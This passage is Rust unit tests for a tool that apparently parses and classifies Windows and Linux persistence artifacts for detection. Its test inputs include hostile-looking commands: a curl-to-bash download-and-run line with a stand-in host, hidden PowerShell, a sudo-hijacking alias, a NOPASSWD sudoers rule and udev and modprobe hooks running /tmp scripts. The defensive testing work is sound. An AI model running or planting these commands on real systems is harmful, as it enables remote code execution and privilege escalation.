        assert_eq!(split_artifact("linux:previous_version:sudoers:nopasswd"), (Os::Linux, State::PreviousVersion, "sudoers:nopasswd".into()));
        assert_eq!(split_artifact("mac:launchd").0, Os::Unknown);
    }

    #[test]
    fn windows_families() {
        assert_eq!(windows_family("c:\\windows\\system32\\svchost.exe"), DirFamily::System32);
        assert_eq!(windows_family("c:\\windows\\system32\\tasks\\x.exe"), DirFamily::WindowsWritable);
        assert_eq!(windows_family("c:\\windows\\temp\\x.exe"), DirFamily::WindowsWritable);
        assert_eq!(windows_family("c:\\windows\\explorer.exe"), DirFamily::WindowsDir);
        assert_eq!(windows_family("c:\\program files (x86)\\a\\b.exe"), DirFamily::ProgramFiles);
        assert_eq!(windows_family("c:\\programdata\\a\\b.exe"), DirFamily::ProgramData);
        assert_eq!(windows_family("c:\\users\\bob\\appdata\\roaming\\x.exe"), DirFamily::UserAppData);
        assert_eq!(windows_family("c:\\users\\bob\\appdata\\local\\temp\\x.exe"), DirFamily::Temp);
        assert_eq!(windows_family("c:\\users\\bob\\appdata\\local\\x\\x.exe"), DirFamily::UserLocalAppData);
        assert_eq!(windows_family("c:\\users\\bob\\downloads\\x.exe"), DirFamily::UserProfile);
        assert_eq!(windows_family("c:\\users\\public\\x.exe"), DirFamily::Public);
        assert_eq!(windows_family("c:\\$recycle.bin\\s-1-5-21-1\\x.exe"), DirFamily::Recycle);
        assert_eq!(windows_family("c:\\x.exe"), DirFamily::DriveRoot);
        assert_eq!(windows_family("d:\\tools\\x.exe"), DirFamily::Other);
        assert_eq!(windows_family("\\\\srv\\share\\x.exe"), DirFamily::Unc);
        assert_eq!(windows_family("x.exe"), DirFamily::Bare);
        assert_eq!(windows_family(""), DirFamily::Bare);
    }

    #[test]
    fn windows_expansion() {
        assert_eq!(expand_windows_path("%SystemRoot%\\System32\\x.dll"), "c:\\windows\\system32\\x.dll");
        assert_eq!(expand_windows_path("\\SystemRoot\\System32\\drivers\\x.sys"), "c:\\windows\\system32\\drivers\\x.sys");
        assert_eq!(expand_windows_path("\\??\\C:\\Windows\\x.exe"), "c:\\windows\\x.exe");
        assert_eq!(expand_windows_path("%APPDATA%\\x.exe"), "c:\\users\\<user>\\appdata\\roaming\\x.exe");
        assert_eq!(expand_windows_path("\"%TEMP%\\x.exe\""), "c:\\users\\<user>\\appdata\\local\\temp\\x.exe");
        assert_eq!(expand_windows_path("system32\\x.dll"), "c:\\windows\\system32\\x.dll");
    }

    #[test]
    fn windows_image_extraction() {
        let e = extract_windows("\"C:\\Program Files\\App\\app.exe\" /silent");
        assert_eq!(e.image, "c:\\program files\\app\\app.exe");
        assert!(e.launcher.is_empty());
        let e = extract_windows("C:\\Windows\\system32\\svchost.exe -k netsvcs -p");
        assert_eq!(e.image, "c:\\windows\\system32\\svchost.exe");
        let e = extract_windows("rundll32.exe C:\\Users\\bob\\AppData\\Roaming\\evil.dll,Start");
        assert_eq!(e.launcher, "rundll32.exe");
        assert_eq!(e.image, "c:\\users\\bob\\appdata\\roaming\\evil.dll");
        let e = extract_windows("cmd /c start \"\" \"C:\\ProgramData\\u.exe\" -x");
        assert_eq!(e.launcher, "cmd");
        assert_eq!(e.image, "c:\\programdata\\u.exe");
        let e = extract_windows("powershell -nop -w hidden -f C:\\Users\\Public\\a.ps1");
        assert_eq!(e.image, "c:\\users\\public\\a.ps1");
        let e = extract_windows("powershell -enc AAAA");
        assert_eq!(e.image, "powershell");
        assert_eq!(e.launcher, "powershell");
        let e = extract_windows("%ProgramFiles%\\Windows Mail\\wab.exe /thfirstsetup");
        assert_eq!(e.image, "c:\\program files\\windows mail\\wab.exe");
        let e = extract_windows("");
        assert_eq!(e.image, "");
    }

    #[test]
    fn linux_command_formats() {
        assert_eq!(linux_command_of("Systemd Unit: evil.service (Desc: Evil, Exec: /tmp/x.sh --daemon)"), "/tmp/x.sh --daemon");
        assert_eq!(linux_command_of("System Cron: /usr/bin/x -a (File: /etc/crontab)"), "/usr/bin/x -a");
        assert_eq!(linux_command_of("User Cron * * * * *: /tmp/b.sh"), "/tmp/b.sh");
        assert_eq!(linux_command_of("User Cron: @reboot /tmp/b.sh"), "@reboot /tmp/b.sh");
        assert_eq!(
            linux_command_of("Anacron [cron.daily] (Period: 1d, Delay: 5m): run-parts --report /etc/cron.daily"),
            "run-parts --report /etc/cron.daily"
        );
        assert_eq!(linux_command_of("Systemd Timer: x.timer -> x.service (OnCalendar=daily)"), "x.service");
        assert_eq!(linux_command_of("XDG Autostart: a.desktop (A) -> /home/u/.local/a"), "/home/u/.local/a");
        assert_eq!(linux_command_of("Modprobe Install Hook [/etc/modprobe.d/x.conf line 1]: install usb /tmp/x.sh"), "/tmp/x.sh");
        assert_eq!(linux_command_of("Udev [/etc/udev/rules.d/x.rules line 1]: ACTION==\"add\", RUN+=\"/tmp/x.sh\""), "/tmp/x.sh");
        assert_eq!(linux_command_of("Preloaded Dynamic Library: /lib/x.so"), "/lib/x.so");
        assert_eq!(linux_command_of("Kernel Auto-load Module: evil (File: /etc/modules)"), "evil");
        assert_eq!(linux_command_of("rc.local [line 3]: /opt/x &"), "/opt/x &");
        assert_eq!(linux_command_of("/home/u/.bashrc [line 9]: alias sudo='/tmp/s'"), "alias sudo='/tmp/s'");
        assert_eq!(linux_command_of("Sudoers [/etc/sudoers line 2]: bob ALL=(ALL) NOPASSWD: ALL"), "bob ALL=(ALL) NOPASSWD: ALL");
    }

    #[test]
    fn linux_extraction() {
        let e = extract_linux("/bin/sh -c \"curl -s http://x/a | bash\"");
        assert_eq!(e.launcher, "sh");
        assert_eq!(e.image, "curl");
        let e = extract_linux("cd / && run-parts --report /etc/cron.hourly");
        assert_eq!(e.image, "run-parts");
        let e = extract_linux("-/usr/bin/sshd -D");
        assert_eq!(e.image, "/usr/bin/sshd");
        let e = extract_linux("HOME=/root nohup /opt/x/agent &");
        assert_eq!(e.launcher, "nohup");
        assert_eq!(e.image, "/opt/x/agent");
        let e = extract_linux("bash /tmp/.x/run.sh");
        assert_eq!(e.image, "/tmp/.x/run.sh");
        let e = extract_linux("/bin/sh -c");
        assert_eq!(e.image, "/bin/sh");
    }

    #[test]
    fn linux_families() {
        assert_eq!(linux_family("/usr/bin/x"), DirFamily::UsrBin);
        assert_eq!(linux_family("/usr/lib/systemd/x"), DirFamily::UsrLib);
        assert_eq!(linux_family("/tmp/x"), DirFamily::Tmp);
        assert_eq!(linux_family("/dev/shm/x"), DirFamily::DevShm);
        assert_eq!(linux_family("/home/u/.config/x/run"), DirFamily::Hidden);
        assert_eq!(linux_family("/home/u/bin/run"), DirFamily::Home);
        assert_eq!(linux_family("/root/x"), DirFamily::RootHome);
        assert_eq!(linux_family("/opt/x/y"), DirFamily::Opt);
        assert_eq!(linux_family("/etc/cron.daily/x"), DirFamily::Etc);
        assert_eq!(linux_family("/usr/local/bin/x"), DirFamily::UsrLocal);
        assert_eq!(linux_family("run-parts"), DirFamily::Bare);
        assert_eq!(linux_family("./x"), DirFamily::Other);
        assert_eq!(linux_family("/usr/bin/../x"), DirFamily::UsrBin);
    }

    #[test]
    fn name_classes() {
        assert_eq!(classify_name("svchost.exe"), NameClass::Alpha);
        assert_eq!(classify_name("ie4uinit.exe"), NameClass::AlphaDigits);
        assert_eq!(classify_name("a8f3k2q1.exe"), NameClass::DigitHeavy);
        assert_eq!(classify_name("deadbeef01.exe"), NameClass::HexLike);
        assert_eq!(classify_name("x.exe"), NameClass::Tiny);
        assert_eq!(classify_name("ab"), NameClass::Tiny);
        assert_eq!(classify_name("ñandú.exe"), NameClass::Odd);
        assert_eq!(classify_name(""), NameClass::Empty);
        assert_eq!(classify_name("Google Update.exe"), NameClass::Alpha);
        assert_eq!(classify_name("0anacron"), NameClass::AlphaDigits);
    }

    #[test]
    fn canonical_masks() {
        let c = canonical(Os::Windows, "registry_run_key", "c:\\users\\bob\\appdata\\roaming\\x.exe {12345678-1234-1234-1234-123456789abc}");
        assert_eq!(c, "registry_run_key|c:\\users\\<user>\\appdata\\roaming\\x.exe <guid>");
        let c = canonical(Os::Windows, "t", "d:\\x\\y.exe s-1-5-21-111-222-333-1001");
        assert_eq!(c, "t|c:\\x\\y.exe <sid>");
        let c = canonical(Os::Linux, "cron:user_spool", "/home/alice/.x/run.sh");
        assert_eq!(c, "cron:user_spool|/home/<user>/.x/run.sh");
    }

    #[test]
    fn timestamps() {
        assert!(parse_timestamp("2026-10-28 12:00:00.000").is_some());
        assert!(parse_timestamp("2026-10-28 12:00:00").is_some());
        assert!(parse_timestamp("2026-10-28T12:00:00Z").is_some());
        assert!(parse_timestamp("").is_none());
        assert!(parse_timestamp("1970-01-01 00:00:00.000").is_none());
        assert!(parse_timestamp("yesterday").is_none());
    }

    fn ev(artifact: &str, cmd: &str) -> Event {
        Event {
            timestamp: "2026-10-28 12:00:00.000".into(),
            computer: "WS01".into(),
            artifact: artifact.into(),
            event_id: 0,
            pid: 0,
            subject_username: "User".into(),
            target_username: "User".into(),
            processname: String::new(),
            commandline: Some(cmd.into()),
            parentprocessname: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".into(),
        }
    }

    #[test]
    fn normalize_windows_row() {
        let r = normalize(3, &ev("windows:persistence:registry_run_key", "\"C:\\Users\\bob\\AppData\\Local\\Temp\\upd.exe\" -s"));
        assert_eq!(r.index, 3);
        assert_eq!(r.os, Os::Windows);
        assert_eq!(r.technique, "registry_run_key");
        assert_eq!(r.family, DirFamily::Temp);
        assert_eq!(r.image_name, "upd.exe");
        assert_eq!(r.image_ext, ".exe");
        assert_eq!(r.name_class, NameClass::Alpha);
        assert!(r.ts.is_some());
    }

    #[test]
    fn normalize_linux_row() {
        let mut e = ev("linux:cron:system_job", "System Cron: /bin/bash -c '/dev/shm/.k/run' (File: /etc/cron.d/x)");
        e.parentprocessname = "crond".into();
        let r = normalize(0, &e);
        assert_eq!(r.os, Os::Linux);
        assert_eq!(r.technique, "cron:system_job");
        assert_eq!(r.command, "/bin/bash -c '/dev/shm/.k/run'");
        assert_eq!(r.launcher, "bash");
        assert_eq!(r.image, "/dev/shm/.k/run");
        assert_eq!(r.family, DirFamily::DevShm);
    }
}
